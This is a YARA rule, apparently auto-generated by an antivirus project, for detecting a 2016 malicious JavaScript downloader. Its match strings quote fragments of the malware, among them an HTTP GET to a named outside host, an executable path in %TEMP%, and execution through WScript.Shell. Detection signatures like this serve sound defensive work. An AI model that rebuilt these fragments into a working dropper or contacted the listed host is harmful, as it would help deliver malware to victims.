rule sig_20160328_263145ef71e66230b6ade22de25ad655 {
  meta:
    description = "datamaliciousorder - file 20160328_263145ef71e66230b6ade22de25ad655.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ecb49a5620e268a736fa8f8f83c826d10d7a9385dfc92e2628989b2fca8ed184"

  strings:
    $s1  = "function Accmwvuvj() {return Cixjj[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"S82g6fqBdcPbS6gK.exe\";};" fullword ascii
    $s2  = "Kmwqzzwt[Angleui](\"GET\", \"http://bbwsa.com/m7rysa\", false);" fullword ascii
    $s3  = "do {WScript[Txxttxt](Izzlppqis() * 11)} while (Kmwqzzwt[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Cixjj = function Oihwj() {return WScript[Xryaec](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Ongviiifh(Omyvekt, Ujwec){return Omyvekt - Ujwec;};" fullword ascii
    $s6  = "function Phixu(Vbacxqewga){Cixjj[\"Run\"](Vbacxqewga, Wwtbnyobe, Wwtbnyobe);};" fullword ascii
    $s7  = "function Rkzaeewzh() {return ((Pxigz == true) && (Pxigz == Kmfvrnmzgy)) ? 1 : Wwtbnyobe;};" fullword ascii
    $s8  = " while (Cmakgx){" fullword ascii
    $s9  = "var Kmfvrnmzgy = false;" fullword ascii
    $s10 = "function Xplgvy()" fullword ascii
    $s11 = "var Miubfs = false;" fullword ascii
    $s12 = "function Ennowtx(){return Xryaec;};" fullword ascii
    $s13 = "return Ongviiifh(Fotdc, Pwwjhcxw);" fullword ascii
    $s14 = "Pxigz = true; " fullword ascii
    $s15 = "var Pxigz = false;" fullword ascii
    $s16 = "function Psnldsvdhr(){return Ullnentaf;};" fullword ascii
    $s17 = "var Qnvpnqvtp = new this[\"Date\"]();" fullword ascii
    $s18 = "Kmfvrnmzgy = true; " fullword ascii
    $s19 = "function Fibjxpb(Nmuywpmf) {var Wgzwfay = (1, 2, 3, 4, 5, Nmuywpmf); return Wgzwfay;};" fullword ascii
    $s20 = "function Izzlppqis(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}